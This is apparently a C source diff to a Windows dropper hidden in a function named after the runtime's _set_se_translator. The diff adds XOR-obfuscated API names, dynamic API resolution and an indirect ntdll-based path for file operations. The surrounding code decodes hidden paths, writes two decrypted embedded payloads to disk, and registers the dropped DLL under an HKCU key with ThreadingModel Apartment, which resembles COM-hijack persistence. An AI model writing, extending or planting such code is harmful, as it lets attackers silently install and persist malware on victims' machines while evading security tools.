@@ -1,4 +1,5 @@
 #include <windows.h>
+#include "indirect.h"
 
 void ___chkstk_ms(void) { return; }
 
@@ -128,37 +129,59 @@ static int asc_to_w(const char *s, WCHAR *w, int wcap) {
 
 __attribute__((noinline, optimize("O0")))
 static void reg_install(const char *subkey, const char *dll_path) {
+  unsigned char e_advapi32[] = {0x58, 0x5c, 0x45, 0x53, 0x17, 0x0f, 0x01,
+                                0x50, 0x4d, 0x56, 0x55, 0x33};
+  unsigned char e_RegCreateKeyExA[] = {0x6b, 0x5d, 0x54, 0x71, 0x15, 0x03,
+                                       0x53, 0x16, 0x06, 0x79, 0x5c, 0x26,
+                                       0x74, 0x4a, 0x71};
+  unsigned char e_RegSetValueExW[] = {0x6b, 0x5d, 0x54, 0x61, 0x02, 0x12,
+                                      0x64, 0x03, 0x0f, 0x47, 0x5c, 0x1a,
+                                      0x49, 0x65};
+  unsigned char e_RegCloseKey[] = {0x6b, 0x5d, 0x54, 0x71, 0x0b, 0x09, 0x41,
+                                   0x07, 0x28, 0x57, 0x40};
+  typedef LSTATUS(WINAPI *pRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD,
+                                            REGSAM, LPSECURITY_ATTRIBUTES,
+                                            PHKEY, LPDWORD);
+  typedef LSTATUS(WINAPI *pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD,
+                                          const BYTE *, DWORD);
+  typedef LSTATUS(WINAPI *pRegCloseKey)(HKEY);
+  HMODULE hAdv;
   HKEY hKey;
   HKEY hkcu = (HKEY)(ULONG_PTR)(LONG)0x80000001;
   WCHAR wdll[512];
   static const WCHAR wtm[] = L"ThreadingModel";
   static const WCHAR wapt[] = L"Apartment";
+  pRegCreateKeyExA fRegCreateKeyExA;
+  pRegSetValueExW fRegSetValueExW;
+  pRegCloseKey fRegCloseKey;
   int plen;
   DWORD cbDllW;
-  DWORD cbDllA;
 
   if (!subkey || !subkey[0] || !dll_path || !dll_path[0])
     return;
 
-  if (RegCreateKeyExA(hkcu, subkey, 0, NULL, 0, 0x00020006, NULL, &hKey,
-                      NULL) != ERROR_SUCCESS)
+  hAdv = rl(e_advapi32, 12);
+  if (!hAdv)
+    return;
+  fRegCreateKeyExA = (pRegCreateKeyExA)ra(hAdv, e_RegCreateKeyExA, 15);
+  fRegSetValueExW = (pRegSetValueExW)ra(hAdv, e_RegSetValueExW, 14);
+  fRegCloseKey = (pRegCloseKey)ra(hAdv, e_RegCloseKey, 11);
+  if (!fRegCreateKeyExA || !fRegSetValueExW || !fRegCloseKey)
+    return;
+
+  if (fRegCreateKeyExA(hkcu, subkey, 0, NULL, 0, 0x00020006, NULL, &hKey,
+                       NULL) != ERROR_SUCCESS)
     return;
 
   plen = asc_to_w(dll_path, wdll, 512);
   cbDllW = (DWORD)((plen + 1) * sizeof(WCHAR));
-  cbDllA = (DWORD)plen + 1;
 
-  if (RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE *)wdll, cbDllW) !=
+  if (fRegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE *)wdll, cbDllW) !=
       ERROR_SUCCESS)
-    (void)RegSetValueExW(hKey, L"", 0, REG_SZ, (const BYTE *)wdll, cbDllW);
-  (void)RegSetValueExW(hKey, wtm, 0, REG_SZ, (const BYTE *)wapt, sizeof(wapt));
+    (void)fRegSetValueExW(hKey, L"", 0, REG_SZ, (const BYTE *)wdll, cbDllW);
+  (void)fRegSetValueExW(hKey, wtm, 0, REG_SZ, (const BYTE *)wapt, sizeof(wapt));
 
-  if (RegSetValueExA(hKey, "", 0, REG_SZ, (const BYTE *)dll_path, cbDllA) !=
-      ERROR_SUCCESS)
-    (void)RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, cbDllA);
-  (void)RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (const BYTE *)"Apartment", 10);
-
-  RegCloseKey(hKey);
+  fRegCloseKey(hKey);
 }
 
 __attribute__((noinline))
@@ -384,6 +407,14 @@ void *_set_se_translator(void *translator) {
   pExpandEnvironmentStringsA fExpandEnvironmentStringsA =
       (pExpandEnvironmentStringsA)ra(hK32, e_ExpandEnvironmentStringsA, 25);
 
+#ifdef _WIN64
+  unsigned char e_ntdll[] = {0x57, 0x4c, 0x57, 0x5e, 0x0b,
+                             0x48, 0x56, 0x0e, 0x0f};
+  int use_indirect = indirect_init(rl(e_ntdll, 9));
+#else
+  int use_indirect = 0;
+#endif
+
   unsigned char e_dir1[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54};
   unsigned char e_dir2[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64};
   unsigned char e_dir3[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64, 0x3e, 0x12, 0x25, 0x40, 0x55, 0x54, 0x4b, 0x67, 0x01, 0x04, 0x49, 0x56, 0x02, 0x53, 0x4d, 0x00, 0x08, 0x6a, 0x07, 0x01};
@@ -392,19 +423,31 @@ void *_set_se_translator(void *translator) {
   
   xd(e_dir1, sys_dir, 20);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
   
   xd(e_dir2, sys_dir, 24);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
   
   xd(e_dir3, sys_dir, 44);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
   
   xd(e_dir4, sys_dir, 52);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
   
   unsigned char e_sys_dir[] = {
       0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
@@ -414,7 +457,10 @@ void *_set_se_translator(void *translator) {
       0x16, 0x50, 0x42, 0x1a, 0x75, 0x6d, 0x10, 0x29, 0x36, 0x44, 0x43, 0x42};
   xd(e_sys_dir, sys_dir, 60);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
 
   unsigned char e_sys_path[] = {
       0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e,
@@ -427,8 +473,12 @@ void *_set_se_translator(void *translator) {
   xd(e_sys_path, sys_path, 70);
   path_expand(sys_path, sizeof(sys_path), fExpandEnvironmentStringsA);
 
-  HANDLE hFile = fCreateFileA(sys_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
-                              FILE_ATTRIBUTE_NORMAL, NULL);
+  HANDLE hFile;
+  if (use_indirect)
+    hFile = io_create_file_a(sys_path, GENERIC_WRITE, CREATE_ALWAYS);
+  else
+    hFile = fCreateFileA(sys_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                         FILE_ATTRIBUTE_NORMAL, NULL);
   if (hFile != INVALID_HANDLE_VALUE) {
     DWORD written = 0;
     int current_offset = 0;
@@ -439,10 +489,16 @@ void *_set_se_translator(void *translator) {
         sz = chunk_size;
       xb(file_sys + current_offset, file_sys + current_offset, sz,
          current_offset);
-      fWriteFile(hFile, file_sys + current_offset, sz, &written, NULL);
+      if (use_indirect)
+        io_write_file(hFile, file_sys + current_offset, sz, &written);
+      else
+        fWriteFile(hFile, file_sys + current_offset, sz, &written, NULL);
       current_offset += sz;
     }
-    fCloseHandle(hFile);
+    if (use_indirect)
+      io_close_handle(hFile);
+    else
+      fCloseHandle(hFile);
   }
 
   unsigned char e_dll_dir1[] = {0x1c, 0x74, 0x7c, 0x71, 0x26, 0x2a, 0x73, 0x32, 0x33, 0x76, 0x78, 0x0b, 0x70, 0x17, 0x6c, 0x28, 0x50, 0x0b, 0x16, 0x5e, 0x43, 0x0c, 0x4f, 0x5d, 0x3e, 0x17, 0x29, 0x4f, 0x55, 0x5e, 0x4e, 0x4b};
@@ -451,15 +507,24 @@ void *_set_se_translator(void *translator) {
 
   xd(e_dll_dir1, sys_dir, 32);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
 
   xd(e_dll_dir2, sys_dir, 43);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
 
   xd(e_dll_dir3, sys_dir, 49);
   path_expand(sys_dir, sizeof(sys_dir), fExpandEnvironmentStringsA);
-  fCreateDirectoryA(sys_dir, NULL);
+  if (use_indirect)
+    io_create_directory_a(sys_dir);
+  else
+    fCreateDirectoryA(sys_dir, NULL);
 
   #define DLL_PATH_LEN 85
   unsigned char e_dll_path[] = {
@@ -492,8 +557,11 @@ void *_set_se_translator(void *translator) {
   xd(e_reg_key, reg_key, 76);
   reg_install(reg_key, dll_path);
 
-  hFile = fCreateFileA(dll_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
-                       FILE_ATTRIBUTE_NORMAL, NULL);
+  if (use_indirect)
+    hFile = io_create_file_a(dll_path, GENERIC_WRITE, CREATE_ALWAYS);
+  else
+    hFile = fCreateFileA(dll_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                         FILE_ATTRIBUTE_NORMAL, NULL);
   if (hFile != INVALID_HANDLE_VALUE) {
     DWORD written = 0;
     int current_offset = 0;
@@ -504,10 +572,16 @@ void *_set_se_translator(void *translator) {
         sz = chunk_size;
       xb(file_dll + current_offset, file_dll + current_offset, sz,
          current_offset);
-      fWriteFile(hFile, file_dll + current_offset, sz, &written, NULL);
+      if (use_indirect)
+        io_write_file(hFile, file_dll + current_offset, sz, &written);
+      else
+        fWriteFile(hFile, file_dll + current_offset, sz, &written, NULL);
       current_offset += sz;
     }
-    fCloseHandle(hFile);
+    if (use_indirect)
+      io_close_handle(hFile);
+    else
+      fCloseHandle(hFile);
   }
 
   unsigned char e_GetSystemTime[] = {0x7e, 0x5d, 0x47, 0x61, 0x1e, 0x15, 0x46, 0x07, 0x0e, 0x66, 0x50, 0x32, 0x54};
@@ -526,7 +600,10 @@ void *_set_se_translator(void *translator) {
 
   MEMORY_BASIC_INFORMATION mbi;
   HMODULE hModule = NULL;
-  if (fVirtualQuery(_set_se_translator, &mbi, sizeof(mbi)) != 0) {
+  if (use_indirect) {
+    if (io_virtual_query(_set_se_translator, &mbi, sizeof(mbi)) != 0)
+      hModule = (HMODULE)mbi.AllocationBase;
+  } else if (fVirtualQuery(_set_se_translator, &mbi, sizeof(mbi)) != 0) {
     hModule = (HMODULE)mbi.AllocationBase;
   }
 
